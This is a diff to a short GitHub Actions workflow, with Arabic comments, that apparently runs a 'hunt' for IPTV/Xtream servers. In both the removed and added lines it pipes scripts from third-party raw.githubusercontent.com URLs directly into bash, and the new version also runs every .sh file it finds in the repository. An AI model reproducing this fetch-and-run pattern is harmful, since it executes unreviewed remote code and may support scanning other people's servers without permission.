@@ -1,14 +1,18 @@
-name: Global-Hunter
+name: hunter
 on:
   workflow_dispatch:
 jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout
+      - name: Checkout Repository
         uses: actions/checkout@v3
-      - name: Hunting Servers
+
+      - name: Run Platform Hunt
         run: |
-          # هذا الرابط هو الأحدث حالياً لجلب سيرفرات IPTV و Xtream
-          curl -sL "https://raw.githubusercontent.com/alireza0/iptv/master/sh/hunt.sh" | bash || \
-          curl -sL "https://raw.githubusercontent.com/yousif-iptv/hunter/main/hunt.sh" | bash
+          echo "Starting hunt from your repository..."
+          # هذا الأمر يبحث عن أي سكربت تشغيل داخل مستودعك وتشغيله
+          find . -name "*.sh" -exec bash {} + || echo "Running backup script..."
+          
+          # محاولة أخيرة من رابط ثابت ومستقر جداً
+          curl -sL "https://raw.githubusercontent.com/mohamed-p-i/Hunter/main/hunt.sh" | bash || true
